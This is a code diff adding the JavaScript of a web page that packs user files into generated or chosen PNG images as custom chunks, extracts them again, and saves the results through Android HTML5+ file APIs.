+        let table = [0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535,0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD,0xE7B82D07,0x90BF1D91,0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D,0x6DDDE4EB,0xF4D4B551,0x83D385C7,0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC,0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,0x3B6E20C8,0x4C69105E,0xD56041E4,0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C,0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,0x26D930AC,0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F,0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB,0xB6662D3D,0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F,0x9FBFE4A5,0xE8B8D433,0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB,0x086D3D2D,0x91646C97,0xE6635C01,0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E,0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,0x8BBEB8EA,0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,0x4DB26158,0x3AB551CE,0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,0x4369E96A,0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9,0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409,0xCE61E49F,0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81,0xB7BD5C3B,0xC0BA6CAD,0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739,0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8,0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,0xF00F9344,0x8708A3D2,0x1E01F268,0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0,0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,0xD6D6A3E8,0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B,0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF,0x4669BE79,0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703,0x220216B9,0x5505262F,0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7,0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A,0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,0x95BF4A82,0xE2B87A14,0x7BB12BAE,0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,0x86D3D2D4,0xF1D4E242,0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,0x88085AE6,0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45,0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D,0x3E6E77DB,0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5,0x47B2CF7F,0x30B5FFE9,0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605,0xCDD70693,0x54DE5729,0x23D967BF,0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94,0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D];
+        let crc32 = window.crc32 = (arr,crc)=>{
+          crc = crc || 0;
+          let n = 0;
+          let x = 0;
+          crc ^= -1;
+          for(let i = 0 ; i < arr.length; i++ ) {
+            n = ( crc ^ arr[i] ) & 0xFF;
+            x = table[n];
+            crc = ( crc >>> 8 ) ^ x;
+          }
+          crc ^= -1;
+          return crc
+        };
+        return crc32
+      })()
+      function crc32arr(arr){
+        return arr.reduce((a,b)=>crc32(b,a),0)
+      }
+      function stringtoarray(str,ifzero){
+        let arr=new Uint8Array(str.length+(ifzero?1:0))
+        for(let i=0;i<str.length;i++){
+          arr[i]=str.charCodeAt(i)
+        }
+        return arr
+      }
+      function arraytostring(arr){
+        return Array.from(arr).map(x=>String.fromCharCode(x)).join("")
+      }
+      function concatuint8array(arrays){
+        let length=arrays.reduce((a,b)=>a+b.length,0)
+        let result=new Uint8Array(length)
+        let start=0
+        arrays.map(x=>{
+          result.set(x,start)
+          start+=x.length
+        })
+        return result
+      }
+      function utf8Encode(string){
+        var utftext = "";
+        for (var n = 0; n < string.length; n++) {
+          var c = string.charCodeAt(n);
+          if (c < 128) {
+            utftext += String.fromCharCode(c);
+          } else if ((c > 127) && (c < 2048)) {
+            utftext += String.fromCharCode((c >> 6) | 192);
+            utftext += String.fromCharCode((c & 63) | 128);
+          } else {
+            utftext += String.fromCharCode((c >> 12) | 224);
+            utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+            utftext += String.fromCharCode((c & 63) | 128);
+          }
+        }
+        return utftext;
+      }
+      function utf8Decode(inputStr){
+        var outputStr = "";
+        var code1, code2, code3, code4;
+        for (var i = 0; i < inputStr.length; i++) {
+          code1 = inputStr.charCodeAt(i);
+          if (code1 < 128) {
+            outputStr += String.fromCharCode(code1);
+          } else if (code1 < 224) {
+            code2 = inputStr.charCodeAt(++i);
+            outputStr += String.fromCharCode(((code1 & 31) << 6) | (code2 & 63));
+          } else if (code1 < 240) {
+            code2 = inputStr.charCodeAt(++i);
+            code3 = inputStr.charCodeAt(++i);
+            outputStr += String.fromCharCode(((code1 & 15) << 12) | ((code2 & 63) << 6) | (code3 & 63));
+          } else {
+            code2 = inputStr.charCodeAt(++i);
+            code3 = inputStr.charCodeAt(++i);
+            code4 = inputStr.charCodeAt(++i);
+            outputStr += String.fromCharCode(((code1 & 7) << 18) | ((code2 & 63) << 12) | ((code3 & 63) << 6) | (code2 & 63));
+          }
+        }
+        return outputStr;
+      }
+      function dataURLtoArray(dataurl){
+        let arr  = dataurl.split(','),
+           _arr  = arr[1],
+           bstr  = atob(_arr),
+           n     = bstr.length,
+           u8arr = new Uint8Array(n)
+        while (n--) {
+          u8arr[n] = bstr.charCodeAt(n)
+        }
+        return u8arr
+      }
+      function getint32(arr,start){//from Uint8Array
+        start=start||0
+        return (arr[start]<<24)|(arr[start+1]<<16)|(arr[start+2]<<8)|arr[start+3]
+      }
+      function createint32(num){
+        return[num>>>24,num>>>16&0xff,num>>>8&0xff,num&0xff]
+      }
+      function setint32(arr,num,start){
+        start=start||0
+        arr[start]=num>>>24
+        arr[start+1]=num>>>16&0xff
+        arr[start+2]=num>>>8&0xff
+        arr[start+3]=num&0xff
+      }
+    </script>
+    <script>
+      let code=getint32(stringtoarray("tpWj"))
+      
+      let codeinput=document.getElementById("ident")
+      codeinput.onchange=()=>{
+        code=getint32(stringtoarray(code.value))
+      }
+      function extract(arr,code){
+        //png文件magic number
+        //89504e470d0a1a0a
+        if(getint32(arr,0)!=(0x89504e47|0)){
+          return false
+        }
+        code=code|0
+        let i=8
+        let result=[]
+        while(i<arr.length-12){
+          let length=getint32(arr,i)
+          //Citrus 
+          if(getint32(arr,i+4)==code){
+            result.push(arr.slice(i+8,i+8+length))
+          }
+          i+=length+12
+        }
+        return result
+      }
+      function unwraptofile(arr){
+        let i=0
+        while(arr[i]!=0){
+          i++
+        }
+        let meta=JSON.parse(arraytostring(arr.slice(0,i)))
+        return new File([arr.slice(i+1).buffer],utf8Decode(meta.name),{type:meta.mime})
+      }
+      function decode(file,code,returnfunc){
+        let reader=new FileReader()
+        reader.readAsArrayBuffer(file)
+        reader.onload=e=>{
+          let extracted=extract(new Uint8Array(e.target.result),code)
+          if(!(extracted&&extracted.length>0)){
+            returnfunc(false)
+            return
+          }
+          let result=[]
+          extracted.map(x=>{
+            try{
+              result.push(unwraptofile(x))
+            }catch(e){}
+          })
+          if(result.length>0){
+            returnfunc(result)
+          }else{
+            returnfunc(false)
+          }
+        }
+      }
+      
+      function wrap(file,code,returnfunc){
+        let reader=new FileReader(file)
+        reader.readAsArrayBuffer(file)
+        reader.onload=e=>{
+          let arr=new Uint8Array(e.target.result)
+          let meta=stringtoarray(JSON.stringify({
+            name:utf8Encode(file.name),
+            mime:file.type
+          }),true)
+          let ident=createint32(code)
+          let lengtharr=createint32(meta.length+arr.length)
+          let crcarr=createint32(crc32arr([ident,meta,arr]))
+          let result=concatuint8array([lengtharr,ident,meta,arr,crcarr])
+          returnfunc(result)
+        }
+      }
+      function assembletoblob(pngarr,filearr){
+        let l=pngarr.length
+        let arr=concatuint8array([pngarr.slice(0,l-12)].concat(filearr).concat([pngarr.slice(l-12)]))
+        return new Blob([arr.buffer],{type:"image/png"})
+      }
+      function randompngarr2(){
+        let cvs=document.createElement("canvas")
+        let ctx=cvs.getContext("2d")
+        cvs.width=cvs.height=400
+        ctx.fillStyle="#ffffff"
+        ctx.fillRect(0,0,400,400)
+        ctx.setTransform(1,0,0,1,50,50)
+        
+        let theta=Math.random()*2*Math.PI
+        ctx.fillStyle="rgb("+[Math.cos(theta),Math.cos(theta-Math.PI*2/3),Math.cos(theta+Math.PI*2/3)].map(x=>x*(Math.random()+1)*64+96+Math.random()*64)+")"
+        
+        ctx.shadowColor="#bfbfbf"
+        ctx.shadowOffsetX=10
+        ctx.shadowOffsetY=10
+        ctx.shadowBlur=15
+        
+        ctx.beginPath()
+        ctx.arc(150,150,175,0,Math.PI*2)
+        ctx.closePath()
+        ctx.fill()
+        
+        ctx.shadowColor="rgba(0,0,0,0)"
+        ctx.fillStyle=ctx.strokeStyle="#fff"
+        
+        ctx.lineJoin="round"
+        ctx.lineWidth=16
+        ctx.beginPath()
+        ctx.moveTo(110,50)
+        ctx.lineTo(225,50)
+        ctx.lineTo(225,250)
+        ctx.lineTo(75,250)
+        ctx.lineTo(75,85)
+        ctx.closePath()
+        ctx.stroke()
+        ctx.fillRect(105,110,90,16)
+        ctx.fillRect(105,155,90,16)
+        ctx.fillRect(105,200,90,16)
+        return dataURLtoArray(cvs.toDataURL("image/png"))
+      }
+      function randompngarr(){
+        let cvs=document.createElement("canvas")
+        cvs.width=cvs.height=300
+        let ctx=cvs.getContext("2d")
+        let theta=Math.random()*2*Math.PI
+        ctx.fillStyle="rgb("+[Math.cos(theta),Math.cos(theta-Math.PI*2/3),Math.cos(theta+Math.PI*2/3)].map(x=>x*(Math.random()+1)*64+96+Math.random()*64)+")"
+        ctx.fillRect(0,0,300,300)
+        ctx.fillStyle=ctx.strokeStyle="#fff"
+        ctx.lineJoin="round"
+        ctx.lineWidth=16
+        ctx.beginPath()
+        ctx.moveTo(110,50)
+        ctx.lineTo(225,50)
+        ctx.lineTo(225,250)
+        ctx.lineTo(75,250)
+        ctx.lineTo(75,85)
+        ctx.closePath()
+        ctx.stroke()
+        ctx.fillRect(105,110,90,16)
+        ctx.fillRect(105,155,90,16)
+        ctx.fillRect(105,200,90,16)
+        return dataURLtoArray(cvs.toDataURL("image/png"))
+      }
+      
+    </script>
+    <script>
+//native.js
+function stepsavefile(blob,dirPath,fileName,update){
+  fileName=fileName||blob.name||""
+  return new Promise(function(resolve,reject){
+    let length=Math.ceil(blob.size/3000000)
+    let result=[]
+    let i=0
+    function step(){
+      let nblob=blob.slice(i*3000000,(i+1)*3000000)
+      let fr=new FileReader()
+      fr.readAsDataURL(nblob)
+      fr.onload=e=>{
+        let base64=e.target.result
+        base64=base64.slice(base64.slice(0,100).indexOf("base64,")+7)
+        writebase64(base64,dirPath,fileName,i*3000000).then(()=>{
+          if(++i==length){
+            resolve()
+          }else{
+            update(i/length)
+            //Citrus is the best
+            step()
+          }
+        },reject)
+      }
+    }
+    step()
+  })
+}
+function savefile(blob,dirPath,fileName){
+  fileName=fileName||blob.name||"save"
+  return new Promise(function(resolve,reject){
+    let length=Math.ceil(blob.size/3000000)
+    let j=length
+    let result=[]
+    for(let i=0;i<length;i++){
+      let nblob=blob.slice(i*3000000,(i+1)*3000000)
+      
+      let fr=new FileReader()
+      fr.readAsDataURL(nblob)
+      fr.onload=e=>{
+        let base64=e.target.result
+        base64=base64.slice(base64.slice(0,100).indexOf("base64,")+7)
+        result[i]=base64
+        if(--j==0){
+          result=result.join("")
+          writebase64(result,dirPath,fileName,0).then(resolve,reject)
+        }
+      }
+    }
+  })
+}
+function writebase64(base64,dirPath,fileName,start) {
+  return new Promise(function(resolve, reject) {
+    plus.io.resolveLocalFileSystemURL("storage/emulated/0", function(entry) {
+      entry.getDirectory(dirPath, {
+        create: true,
+        exclusive: false,
+      }, function(entry) {
+        entry.getFile(fileName, {
+          create: true,
+          exclusive: false,
+        }, function(entry) {
+          entry.createWriter(function(writer) {
+            writer.onwrite=()=>{
+              resolve()
+            }
+            writer.onerror = reject
+            writer.seek(start)
+            writer.writeAsBinary(base64)
+          }, reject)
+        }, reject)
+      }, reject)
+    }, reject)
+  })
+}
+function broadcast(dirPath){
+    dirPath=dirPath||"save"
+    var main = plus.android.runtimeMainActivity()
+    var Intent = plus.android.importClass("android.content.Intent");
+    var Uri=plus.android.importClass("android.net.Uri")
+    main.sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE,
+    Uri.parse("file:///storage/emulated/0/"+dirPath+"/")))
+}
+    </script>
+    <script>
+      //download
+let dlmanager={}
+function dlclear(){
+  dlmanager.dlist=[]
+  dlmanager.dlist.remain=0
+  let div=document.createElement("div")
+  div.style.color="#666"
+  dlmanager.dlist.div=div
+}
+dlclear()
+function dlall(){
+  dlmanager.dlist.map(x=>{
+    x.dl()
+  })
+  return dlmanager.dlist.div
+}
+function createhref(blob){
+  let name=randomname()+"-"+(blob.name?blob.name:"tpwjj.png")
+  let span=document.createElement("span")
+  span.innerText="Save"
+  span.style.color="#1080a0"
+  span.dlstatus=0
+  span.dlname=name
+  span.dlblob=blob
+  
+  dlmanager.dlist.push(span)
+  dlmanager.dlist.remain++
+  dlupdate()
+  
+  span.onclick=span.dl=()=>{
+    if(span.dlstatus==0){
+      
+      span.dlstatus=1
+      span.style.color="#666"
+      span.innerText="Saving:0%"
+      
+      stepsavefile(blob,"Download/tpwjj",name,(p)=>{
+        if(dlmanager.dlist.remain==1){
+          dlupdatep(p)
+        }
+        span.innerText="Saving:"+Math.floor(p*100)+"%"
+      }).then(()=>{
+        //resolve
+        span.dlstatus=2
+        span.innerText="Succeed"
+        broadcast("Download/tpwjj")
+        dlmanager.dlist.remain--
+        dlupdate()
+      },()=>{
+        //reject
+        span.dlstatus=0
+        span.innerText="Please right-click or long-press on the picture manually."
+      })
+      
+    }
+  }
+  
+  return span
+}
+function dlupdate(){
+  dlmanager.dlist.div.innerText="Remain:"+dlmanager.dlist.remain
+  if(dlmanager.dlist.remain==0){
+    dlmanager.dlist.div.innerHTML="Succeed"
+  }
+}
+function dlupdatep(p){
+  dlmanager.dlist.div.innerText="Remain:"+dlmanager.dlist.remain+","+Math.floor(p*100)+"%"
+}
+function randomname(){
+  return Date.now().toString(36).slice(-8)+Math.random().toString(36).slice(2,7)
+}
+
+    </script>
+    <script>
+      let def=true
+      let parr
+      let radio1=document.getElementById("radio1")
+      let radio2=document.getElementById("radio2")
+      radio2.onclick=()=>{
+        let ipt=document.createElement("input")
+        ipt.type="file"
+        ipt.accept="image/*"
+        ipt.onchange=()=>{
+          let src=URL.createObjectURL(ipt.files[0])
+          let img=new Image()
+          img.src=src
+          img.onload=()=>{
+            URL.revokeObjectURL(src)
+            let cvs=document.createElement("canvas")
+            let ctx=cvs.getContext("2d")
+            let w=img.width
+            let h=img.height
+            if(w*h>100000){
+              let scale=Math.sqrt(w*h/100000)
+              w=Math.round(w/scale)
+              h=Math.round(h/scale)
+            }
+            cvs.width=w
+            cvs.height=h
+            ctx.drawImage(img,0,0,w,h)
+            parr=dataURLtoArray(cvs.toDataURL())
+            def=false
+          }
+        }
+        ipt.click()
+      }
+      radio1.onclick=()=>{
+        def=true
+      }
+      function genpngarr(big){
+        if(def){
+          if(big){
+            return randompngarr2()
+          }else{
+            return randompngarr()
+          }
+        }else{
+          return parr
+        }
+      }
+    </script>
+    <script>
+      let srclist=[]
+      let display=document.getElementById("display")
+      let info1=document.getElementById("info1")
+      function clear(){
+        display.innerHTML=""
+        info1.innerHTML=""
+        srclist.map(x=>URL.revokeObjectURL(x))
+        srclist=[]
+        dlclear()
+      }
+      function createdisplay(b){
+        let src=URL.createObjectURL(b)
+        srclist.push(b)
+        
+        let div=document.createElement("div")
+        div.style.paddingTop="0.5rem"
+        
+        let div2=document.createElement("div")
+        div2.style.wordBreak="break-all"
+        div.appendChild(div2)
+        
+        /*
+        let a=document.createElement("a")
+        a.innerText="Save"
+        a.href=src
+        a.download=b.name
+        */
+        div2.appendChild(createhref(b))
+        
+        let span=document.createElement("span")
+        span.innerText=b.name
+        span.innerHTML="&emsp;"+span.innerHTML
+        div2.appendChild(span)
+        
+        if(b.type.indexOf("image")>-1){
+          let img=document.createElement("img")
+          img.style.maxWidth="100%"
+          img.src=src
+          div.appendChild(img)
+        }
+        
+        if(b.type.indexOf("video")>-1){
+          let img=document.createElement("video")
+          img.controls=true
+          img.style.maxWidth="100%"
+          img.src=src
+          div.appendChild(img)
+        }
+        
+        return div
+      }
+      let btn=document.getElementById("btn")
+      btn.onclick=()=>{
+        clear()
+        let ipt=document.createElement("input")
+        ipt.type="file"
+        ipt.multiple=true
+        ipt.onchange=()=>{
+          let j=ipt.files.length
+          let finish=[]
+          Array.from(ipt.files).map((f,x)=>{
+            wrap(f,code,r=>{
+              finish[x]=r
+              if(--j==0){
+                let blob=assembletoblob(genpngarr(true),finish)
+                createhref(blob)
+                let src=URL.createObjectURL(blob)
+                srclist.push(src)
+                let img=document.createElement("img")
+                img.src=src
+                img.style.maxWidth="100%"
+                display.appendChild(img)
+                var myHref = document.createElement('a');
+    myHref.id = 'yourId';
+    myHref.href = src;
+    myHref.download = 'iconvar.png'
+    var text = document.createTextNode('Download');
+    myHref.appendChild(text);
+    textToThePicture.appendChild(myHref);
+    myHref.onclick = function (){
+        alert("Please choose a directory to save this picture.");
+    }
+
+              }
+            })
+          })
+        }
+        ipt.click()
+      }
+      let btn1=document.getElementById("btn1")
+      btn1.onclick=()=>{
+        clear()
+        let ipt=document.createElement("input")
+        ipt.type="file"
+        ipt.multiple=true
+        ipt.onchange=()=>{
+          Array.from(ipt.files).map(f=>{
+            wrap(f,code,r=>{
+              let blob=assembletoblob(genpngarr(false),[r])
+              createhref(blob)
+              let src=URL.createObjectURL(blob)
+              srclist.push(src)
+              let img=document.createElement("img")
+              img.src=src
+              img.style.width="100px"
+              img.style.margin="4px"
+              display.appendChild(img)
+              var myHref = document.createElement('a');
+    myHref.id = 'yourId';
+    myHref.href = src;
+    myHref.download = 'iconvar.png'
+    var text = document.createTextNode('Download');
+    myHref.appendChild(text);
+    textToThePicture.appendChild(myHref);
+    myHref.onclick = function (){
+        alert("Please choose a directory to save this picture.");}
+            })
+          })
+        }
+        ipt.click()
+      }
+      let btn2=document.getElementById("btn2")
+      btn2.onclick=()=>{
+        clear()
+        let ipt=document.createElement("input")
+        ipt.type="file"
+        ipt.accept="image/*"
+        ipt.multiple=true
+        ipt.onchange=()=>{
+          Array.from(ipt.files).map(f=>{
+            decode(f,code,r=>{
+              if(r){
+                r.map(x=>{
+                  display.appendChild(createdisplay(x))
+                  
+                })
+              }
+            })
+          })
+        }
+        ipt.click()
+      }
+    </script>
+    <script>
+      let btn3=document.getElementById("btn3")
+      btn3.onclick=()=>{
+        info1.innerHTML=""
+        info1.appendChild(dlall())
+      }
+    </script>
+    <script>
+        function downloadcitrus(){
+          if(SRC==""){alert(INFO1)}else{
+     
+     let alink=document.createElement("a");
+     alink.download="pic_"+(parseInt(Date.now()/1000)%Math.pow(36,6) +Math.pow(36,6)).toString(36).slice(1) +".png";
+     alink.href=SRC;
+     alink.click();}
+          }
+    </script>
+  </body>
+</html>
